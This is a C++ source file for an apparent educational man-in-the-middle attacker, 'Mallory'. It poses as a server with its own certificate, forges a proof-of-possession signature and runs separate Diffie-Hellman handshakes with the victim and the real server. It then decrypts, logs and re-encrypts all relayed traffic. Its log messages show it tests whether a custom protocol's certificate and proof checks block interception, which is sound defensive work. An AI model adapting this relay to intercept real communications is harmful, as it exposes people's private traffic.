#include <iostream>
#include <string>
#include <cstring>
#include <vector>
#include <cstdint>
#include <mutex>
#include <thread>
#include <atomic>
#include <sstream>
#include <iomanip>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <openssl/bn.h>
#include "dh/dh.h"
#include "crypto/crypto.h"
#include "cert.h"

std::mutex log_mutex;

void mlog(const std::string& msg) {
    std::lock_guard<std::mutex> lock(log_mutex);
    std::cout << msg << std::endl;
}

std::string trim(const std::string& s) {
    size_t start = 0, end = s.size();
    while (start < end && std::isspace(static_cast<unsigned char>(s[start]))) start++;
    while (end > start && std::isspace(static_cast<unsigned char>(s[end - 1]))) end--;
    return s.substr(start, end - start);
}

std::vector<std::string> parse_frame(const std::string& raw) {
    std::vector<std::string> parts;
    size_t first = raw.find('|');
    if (first == std::string::npos) {
        parts.push_back(trim(raw));
        return parts;
    }
    parts.push_back(trim(raw.substr(0, first)));

    size_t second = raw.find('|', first + 1);
    if (second == std::string::npos) {
        parts.push_back(trim(raw.substr(first + 1)));
    } else {
        parts.push_back(raw.substr(first + 1, second - first - 1));
        parts.push_back(raw.substr(second + 1));
    }
    return parts;
}

static const size_t MAX_MSG_SIZE = 1 << 20;

ssize_t recv_exact(int fd, void* buf, size_t n) {
    size_t got = 0;
    char* p = static_cast<char*>(buf);
    while (got < n) {
        ssize_t r = recv(fd, p + got, n - got, 0);
        if (r <= 0) return r;
        got += static_cast<size_t>(r);
    }
    return static_cast<ssize_t>(got);
}

bool send_exact(int fd, const void* buf, size_t n) {
    size_t sent = 0;
    const char* p = static_cast<const char*>(buf);
    while (sent < n) {
        ssize_t s = send(fd, p + sent, n - sent, MSG_NOSIGNAL);
        if (s <= 0) return false;
        sent += static_cast<size_t>(s);
    }
    return true;
}

bool send_framed(int fd, const std::string& payload) {
    uint32_t len = htonl(static_cast<uint32_t>(payload.size()));
    if (!send_exact(fd, &len, sizeof(len))) return false;
    return send_exact(fd, payload.data(), payload.size());
}

bool recv_framed(int fd, std::string& out) {
    uint32_t len_net;
    if (recv_exact(fd, &len_net, sizeof(len_net)) <= 0) return false;
    uint32_t len = ntohl(len_net);
    if (len > MAX_MSG_SIZE) return false;
    out.resize(len);
    if (len == 0) return true;
    return recv_exact(fd, out.data(), len) > 0;
}

bool perform_dh_as_server(int fd, BIGNUM* p, BIGNUM* g, BN_CTX* ctx, BIGNUM*& shared_secret_out) {
    std::string frame;
    if (!recv_framed(fd, frame)) return false;

    auto parts = parse_frame(frame);
    if (parts.empty() || parts[0] != "DH_INIT" || parts.size() < 2) return false;

    BIGNUM* their_pub = nullptr;
    if (!BN_hex2bn(&their_pub, parts[1].c_str())) return false;

    DHKeyPair my_kp = dh_generate_keypair(p, g, ctx);
    shared_secret_out = dh_compute_shared_secret(their_pub, my_kp.priv, p, ctx);

    bool ok = send_framed(fd, "DH_RESP|" + dh_bn_to_hex(my_kp.pub));

    BN_free(their_pub);
    dh_free_keypair(my_kp);
    return ok;
}

bool perform_dh_as_client(int fd, BIGNUM* p, BIGNUM* g, BN_CTX* ctx, BIGNUM*& shared_secret_out) {
    DHKeyPair my_kp = dh_generate_keypair(p, g, ctx);

    if (!send_framed(fd, "DH_INIT|" + dh_bn_to_hex(my_kp.pub))) {
        dh_free_keypair(my_kp);
        return false;
    }

    std::string frame;
    if (!recv_framed(fd, frame)) {
        dh_free_keypair(my_kp);
        return false;
    }

    auto parts = parse_frame(frame);
    if (parts.empty() || parts[0] != "DH_RESP" || parts.size() < 2) {
        dh_free_keypair(my_kp);
        return false;
    }

    BIGNUM* their_pub = nullptr;
    if (!BN_hex2bn(&their_pub, parts[1].c_str())) {
        dh_free_keypair(my_kp);
        return false;
    }

    shared_secret_out = dh_compute_shared_secret(their_pub, my_kp.priv, p, ctx);

    BN_free(their_pub);
    dh_free_keypair(my_kp);
    return true;
}

std::atomic<bool> session_alive{true};

void relay_direction(int from_fd, const unsigned char* from_key,
                      int to_fd, const unsigned char* to_key,
                      const std::string& direction_label) {
    std::string blob;
    while (session_alive && recv_framed(from_fd, blob)) {
        std::string plaintext;
        if (!aes_gcm_decrypt(from_key, blob, plaintext)) {
            mlog("[MALLORY] " + direction_label + ": received a frame it could not decrypt.");
            continue;
        }

        mlog("[MALLORY INTERCEPTED " + direction_label + "] " + plaintext);

        std::string re_encrypted;
        if (!aes_gcm_encrypt(to_key, plaintext, re_encrypted)) {
            mlog("[MALLORY] " + direction_label + ": re-encryption failed.");
            continue;
        }

        if (!send_framed(to_fd, re_encrypted)) {
            mlog("[MALLORY] " + direction_label + ": forwarding failed, peer likely disconnected.");
            break;
        }
    }
    session_alive = false;
}

int main(int argc, char** argv) {
    if (argc < 6) {
        std::cerr << "Usage: " << argv[0] << " <listen_port> <real_server_ip> <real_server_port> <mallory_cert_path> <mallory_key_path>\n";
        return 1;
    }
    int listen_port = std::atoi(argv[1]);
    std::string server_ip = argv[2];
    int server_port = std::atoi(argv[3]);
    std::string mallory_cert_path = argv[4];
    std::string mallory_key_path = argv[5];

    std::string mallory_cert_pem = read_file_to_string(mallory_cert_path);
    if (mallory_cert_pem.empty()) {
        std::cerr << "Could not read " << mallory_cert_path << "\n";
        return 1;
    }
    EVP_PKEY* mallory_key = load_private_key_from_file(mallory_key_path);
    if (!mallory_key) {
        std::cerr << "Could not read " << mallory_key_path << "\n";
        return 1;
    }

    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(listen_port);
    bind(listen_fd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr));
    listen(listen_fd, 8);

    mlog("[MALLORY] Listening for victim on port " + std::to_string(listen_port) + " ...");

    sockaddr_in victim_addr{};
    socklen_t victim_len = sizeof(victim_addr);
    int victim_fd = accept(listen_fd, reinterpret_cast<sockaddr*>(&victim_addr), &victim_len);
    mlog("[MALLORY] Victim connected.");

    mlog("[MALLORY] Presenting a certificate (" + mallory_cert_path + ")...");
    if (!send_framed(victim_fd, "CERT|" + mallory_cert_pem)) {
        mlog("[MALLORY] Failed to send certificate.");
        return 1;
    }

    mlog("[MALLORY] Certificate sent. Waiting to see if victim sends a CHALLENGE (i.e. accepted my cert)...");

    BN_CTX* ctx = BN_CTX_new();
    BIGNUM* p = dh_load_prime();
    BIGNUM* g = dh_load_generator();

    std::string challenge_frame;
    if (!recv_framed(victim_fd, challenge_frame)) {
        mlog("[MALLORY] ATTACK FAILED: victim closed the connection without sending anything further.");
        mlog("[MALLORY] The victim's client rejected my certificate, exactly as intended by Phase 3.");
        close(victim_fd);
        return 1;
    }

    auto challenge_parts = parse_frame(challenge_frame);
    if (challenge_parts.empty() || challenge_parts[0] != "CHALLENGE" || challenge_parts.size() < 2) {
        mlog("[MALLORY] ATTACK FAILED: expected CHALLENGE, got something else or nothing.");
        close(victim_fd);
        return 1;
    }

    mlog("[MALLORY] My certificate was accepted! Victim sent a CHALLENGE: " + challenge_parts[1]);
    mlog("[MALLORY] I do NOT have the real server's private key, so I can only sign with my own.");

    std::string forged_signature;
    sign_data(mallory_key, challenge_parts[1], forged_signature);

    std::ostringstream sig_hex;
    for (unsigned char c : forged_signature) sig_hex << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(c);

    if (!send_framed(victim_fd, "PROOF|" + sig_hex.str())) {
        mlog("[MALLORY] Failed to send forged proof.");
        return 1;
    }

    mlog("[MALLORY] Forged proof sent. Waiting to see if victim proceeds to DH...");

    std::string next_frame;
    if (!recv_framed(victim_fd, next_frame)) {
        mlog("[MALLORY] ATTACK FAILED: victim closed the connection after the proof step.");
        mlog("[MALLORY] Proof-of-possession correctly caught that I don't hold the real private key.");
        close(victim_fd);
        return 1;
    }

    mlog("[MALLORY] Unexpected: victim proceeded past proof-of-possession - this should not happen.");

    BIGNUM* victim_shared_secret = nullptr;
    if (!perform_dh_as_server(victim_fd, p, g, ctx, victim_shared_secret)) {
        mlog("[MALLORY] DH handshake with victim failed.");
        return 1;
    }
    unsigned char victim_key[32];
    dh_derive_aes_key(victim_shared_secret, victim_key);
    mlog("[MALLORY] DH #1 complete (posing as server, talking to victim). Fingerprint: "
         + dh_sha256_fingerprint(victim_shared_secret));

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in srv_addr{};
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(server_port);
    inet_pton(AF_INET, server_ip.c_str(), &srv_addr.sin_addr);
    if (connect(server_fd, reinterpret_cast<sockaddr*>(&srv_addr), sizeof(srv_addr)) < 0) {
        mlog("[MALLORY] Could not connect to real server.");
        return 1;
    }
    mlog("[MALLORY] Connected outbound to real server at " + server_ip + ":" + std::to_string(server_port));

    BIGNUM* server_shared_secret = nullptr;
    if (!perform_dh_as_client(server_fd, p, g, ctx, server_shared_secret)) {
        mlog("[MALLORY] DH handshake with real server failed.");
        return 1;
    }
    unsigned char server_key[32];
    dh_derive_aes_key(server_shared_secret, server_key);
    mlog("[MALLORY] DH #2 complete (posing as client, talking to real server). Fingerprint: "
         + dh_sha256_fingerprint(server_shared_secret));

    mlog("[MALLORY] Both handshakes complete. Two independent shared secrets established.");
    mlog("[MALLORY] Neither the victim nor the real server can tell they are talking to Mallory.");
    mlog("[MALLORY] Relaying traffic in both directions, decrypting and re-encrypting at each hop:\n");

    std::thread victim_to_server(relay_direction, victim_fd, victim_key, server_fd, server_key, "victim->server");
    std::thread server_to_victim(relay_direction, server_fd, server_key, victim_fd, victim_key, "server->victim");

    victim_to_server.join();
    server_to_victim.join();

    mlog("[MALLORY] Session ended.");

    close(victim_fd);
    close(server_fd);
    return 0;
}